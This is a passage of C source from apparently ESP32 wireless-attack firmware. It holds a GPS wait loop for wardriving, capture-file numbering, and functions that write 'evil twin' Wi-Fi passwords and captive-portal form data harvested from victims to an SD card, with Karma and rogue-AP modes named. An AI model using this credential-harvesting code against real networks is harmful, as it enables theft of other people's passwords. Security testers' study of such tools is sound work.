        MY_LOG_INFO(TAG, "Waiting for GPS fix (external feed, timeout: %d seconds)...", timeout_seconds);
    } else {
        MY_LOG_INFO(TAG, "Waiting for GPS fix (timeout: %d seconds)...", timeout_seconds);
    }
    
    while (infinite || elapsed < timeout_seconds) {
        // Check for stop request
        if (operation_stop_requested) {
            MY_LOG_INFO(TAG, "GPS wait: Stop requested, terminating...");
            return false;
        }

        if (external_feed) {
            gps_sync_from_selected_external_source();
            if (current_gps.valid) {
                return true;
            }
            vTaskDelay(pdMS_TO_TICKS(1000));
        } else {
            // Read GPS data from UART/NMEA source
            int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
            if (len > 0) {
                wardrive_gps_buffer[len] = '\0';
                char* line = strtok(wardrive_gps_buffer, "\r\n");
                while (line != NULL) {
                    if (parse_gps_nmea(line)) {
                        if (current_gps.valid) {
                            return true;  // GPS fix obtained
                        }
                    }
                    line = strtok(NULL, "\r\n");
                }
            }
        }
        
        elapsed++;
        if (elapsed % 10 == 0) {  // Print status every 10 seconds
            if (infinite) {
                if (external_feed) {
                    MY_LOG_INFO(TAG, "Still waiting for GPS fix (external feed)... (%d seconds)", elapsed);
                } else {
                    MY_LOG_INFO(TAG, "Still waiting for GPS fix... (%d seconds)", elapsed);
                }
            } else {
                if (external_feed) {
                    MY_LOG_INFO(TAG, "Still waiting for GPS fix (external feed)... (%d/%d seconds)", elapsed, timeout_seconds);
                } else {
                    MY_LOG_INFO(TAG, "Still waiting for GPS fix... (%d/%d seconds)", elapsed, timeout_seconds);
                }
            }
        }
    }
    
    return false;  // Timeout reached without GPS fix
}

static int find_next_wardrive_file_number(void) {
    int max_number = 0;
    char filename[64];
    MY_LOG_INFO(TAG, "Scanning for existing wardrive log files...");
    // Scan through possible file numbers to find the highest existing one
    for (int i = 1; i <= 9999; i++) {
        snprintf(filename, sizeof(filename), "/sdcard/lab/wardrives/w%d.log", i);
        
        struct stat file_stat;
        if (stat(filename, &file_stat) == 0) {
            // File exists, update max_number
            max_number = i;
            MY_LOG_INFO(TAG, "Found existing file: w%d.log", i);
        } else {
            // First non-existing file number, we can break here for efficiency
            break;
        }
    }
    
    int next_number = max_number + 1;
    MY_LOG_INFO(TAG, "Highest existing file number: %d, next will be: %d", max_number, next_number);
    
    return next_number;
}

static int find_next_pcap_file_number(void) {
    int max_number = 0;
    char filename[64];
    for (int i = 1; i <= 9999; i++) {
        snprintf(filename, sizeof(filename), "/sdcard/lab/pcaps/sniff_%d.pcap", i);
        struct stat file_stat;
        if (stat(filename, &file_stat) == 0) {
            max_number = i;
        } else {
            break;
        }
    }
    return max_number + 1;
}

// Save evil twin password to SD card
static void save_evil_twin_password(const char* ssid, const char* password) {
    // Initialize SD card if not already mounted
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card for password logging: %s", esp_err_to_name(ret));
        return;
    }
    
    // Check if /sdcard directory is accessible
    struct stat st;
    if (stat("/sdcard", &st) != 0) {
        MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
        return;
    }
    
    // Check for duplicate before writing
    char match_line[256];
    snprintf(match_line, sizeof(match_line), "\"%s\", \"%s\"", ssid, password);
    
    FILE *file = fopen("/sdcard/lab/eviltwin.txt", "r");
    if (file != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), file) != NULL) {
            if (strstr(line, match_line) != NULL) {
                fclose(file);
                MY_LOG_INFO(TAG, "Credentials already in eviltwin.txt, skipping");
                return;
            }
        }
        fclose(file);
    }
    
    // Try to open file for appending (use short name without underscore for FAT compatibility)
    file = fopen("/sdcard/lab/eviltwin.txt", "a");
    if (file == NULL) {
        MY_LOG_INFO(TAG, "Failed to open eviltwin.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
        
        // Try to create the file first
        file = fopen("/sdcard/lab/eviltwin.txt", "w");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to create eviltwin.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        // Close and reopen in append mode
        fclose(file);
        file = fopen("/sdcard/lab/eviltwin.txt", "a");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to reopen eviltwin.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        MY_LOG_INFO(TAG, "Successfully created eviltwin.txt");
    }
    
    // Write SSID and password in CSV format
    fprintf(file, "\"%s\", \"%s\"\n", ssid, password);
    
    // Flush and close file to ensure data is written to disk
    fflush(file);
    fclose(file);
    sd_sync();
    
    MY_LOG_INFO(TAG, "Password saved to eviltwin.txt");
}

// Save portal form data to SD card
static void save_portal_data(const char* ssid, const char* form_data) {
    {
        const char *mode_name = karma_mode_active ? "> Karma Attack" :
                                rogueap_mode_active ? "> Rogue AP" : "> Captive Portal";
        oled_display_update_full(mode_name, ssid ? ssid : "", "  Data received!", "  Saving to SD");
    }
    // Initialize SD card if not already mounted
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card for portal data logging: %s", esp_err_to_name(ret));
        return;
    }
    
    // Check if /sdcard directory is accessible
    struct stat st;
    if (stat("/sdcard", &st) != 0) {
        MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
        return;
    }
    
    // Try to open file for appending
    FILE *file = fopen("/sdcard/lab/portals.txt", "a");
    if (file == NULL) {
        MY_LOG_INFO(TAG, "Failed to open portals.txt for append, errno: %d (%s). Trying to create...", errno, strerror(errno));
        
        // Try to create the file first
        file = fopen("/sdcard/lab/portals.txt", "w");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to create portals.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        // Close and reopen in append mode
        fclose(file);
        file = fopen("/sdcard/lab/portals.txt", "a");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to reopen portals.txt, errno: %d (%s)", errno, strerror(errno));
            return;
        }
        MY_LOG_INFO(TAG, "Successfully created portals.txt");
    }
    
    // Write SSID as first field
    fprintf(file, "\"%s\", ", ssid ? ssid : "Unknown");
    
    // Parse form data and extract all fields
    // Form data is in format: field1=value1&field2=value2&...
    char *data_copy = strdup(form_data);
    if (data_copy == NULL) {
        fclose(file);
        sd_sync();
        return;
    }
    
    // Count fields first to properly format CSV
    int field_count = 0;
    char *temp_copy = strdup(form_data);
    if (temp_copy == NULL) {
        MY_LOG_INFO(TAG, "Memory allocation failed for temp_copy");
        free(data_copy);
        fclose(file);
        sd_sync();
        return;
    }
    
    char *token = strtok(temp_copy, "&");
    while (token != NULL) {
        field_count++;
        token = strtok(NULL, "&");
    }
    free(temp_copy);
    
    // Now process each field
    int current_field = 0;
    token = strtok(data_copy, "&");
    while (token != NULL) {
        char *equals = strchr(token, '=');
        if (equals != NULL) {
            *equals = '\0';
            char *key = token;
            char *value = equals + 1;

            // URL decode the key
            char decoded_key[128];
            int decoded_key_len = 0;
            for (char *p = key; *p && decoded_key_len < sizeof(decoded_key) - 1; p++) {
                if (*p == '%' && p[1] && p[2]) {
                    char hex[3] = {p[1], p[2], '\0'};
                    decoded_key[decoded_key_len++] = (char)strtol(hex, NULL, 16);
                    p += 2;
                } else if (*p == '+') {
                    decoded_key[decoded_key_len++] = ' ';
                } else {
                    decoded_key[decoded_key_len++] = *p;
                }
            }
            decoded_key[decoded_key_len] = '\0';

            // URL decode the value
            char decoded_value[128];
            int decoded_len = 0;
            for (char *p = value; *p && decoded_len < sizeof(decoded_value) - 1; p++) {
                if (*p == '%' && p[1] && p[2]) {
                    char hex[3] = {p[1], p[2], '\0'};
                    decoded_value[decoded_len++] = (char)strtol(hex, NULL, 16);
                    p += 2;
                } else if (*p == '+') {
                    decoded_value[decoded_len++] = ' ';
                } else {
                    decoded_value[decoded_len++] = *p;
                }
            }
            decoded_value[decoded_len] = '\0';

            // Write field name and value in CSV format as key=value
            fprintf(file, "\"%s=%s\"", decoded_key, decoded_value);

            // Add comma if not last field
            current_field++;
            if (current_field < field_count) {
                fprintf(file, ", ");
            }
        }
        token = strtok(NULL, "&");
    }
    
    // End line
    fprintf(file, "\n");
    
    // Flush and close file to ensure data is written to disk
    fflush(file);
    fclose(file);
    sd_sync();
    
    free(data_copy);
    
    MY_LOG_INFO(TAG, "Portal data saved to portals.txt");
}

// Load whitelist from SD card
static void load_whitelist_from_sd(void) {
    whitelistedBssidsCount = 0; // Reset count
    
    MY_LOG_INFO(TAG, "Checking for whitelist file (white.txt) on SD card...");
    
    // Try to initialize SD card (silently fail if not available)
    esp_err_t ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "SD card not available - whitelist will be empty");
        return;
    }
    
    // Try to open white.txt file
    FILE *file = fopen("/sdcard/lab/white.txt", "r");
    if (file == NULL) {
        MY_LOG_INFO(TAG, "white.txt not found on SD card - whitelist will be empty");
        return;
    }
    
    MY_LOG_INFO(TAG, "Found white.txt, loading whitelisted BSSIDs...");
    
    char line[128];
    int line_number = 0;
    int loaded_count = 0;
    
    while (fgets(line, sizeof(line), file) != NULL && whitelistedBssidsCount < MAX_WHITELISTED_BSSIDS) {
        line_number++;
        
        // Remove trailing newline/whitespace
        line[strcspn(line, "\r\n")] = '\0';
        
        // Skip empty lines
        if (strlen(line) == 0) {
            continue;
        }
        
        // Parse BSSID in format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX
        uint8_t bssid[6];
        int matches = 0;
        
        // Try with colon separator
        matches = sscanf(line, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                        &bssid[0], &bssid[1], &bssid[2],
                        &bssid[3], &bssid[4], &bssid[5]);
        
        // If that didn't work, try with dash separator
        if (matches != 6) {
            matches = sscanf(line, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
                            &bssid[0], &bssid[1], &bssid[2],
                            &bssid[3], &bssid[4], &bssid[5]);
        }
        
        if (matches == 6) {
            // Valid BSSID found, add to whitelist
            memcpy(whiteListedBssids[whitelistedBssidsCount].bssid, bssid, 6);
            whitelistedBssidsCount++;
            loaded_count++;
            
            MY_LOG_INFO(TAG, "  [%d] Loaded: %02X:%02X:%02X:%02X:%02X:%02X",
                       loaded_count,
                       bssid[0], bssid[1], bssid[2],
                       bssid[3], bssid[4], bssid[5]);
        } else {
            MY_LOG_INFO(TAG, "  Line %d: Invalid BSSID format, ignoring: %s", line_number, line);
        }
    }
    
    fclose(file);
    
    if (whitelistedBssidsCount > 0) {
        MY_LOG_INFO(TAG, "Successfully loaded %d whitelisted BSSID(s)", whitelistedBssidsCount);
    } else {
        MY_LOG_INFO(TAG, "No valid BSSIDs found in white.txt");
    }
}

// Check if a BSSID is in the whitelist
static bool is_bssid_whitelisted(const uint8_t *bssid) {
    if (bssid == NULL || whitelistedBssidsCount == 0) {
        return false;
    }
    
    for (int i = 0; i < whitelistedBssidsCount; i++) {
        if (memcmp(bssid, whiteListedBssids[i].bssid, 6) == 0) {
            return true;
        }
    }
    
    return false;
}


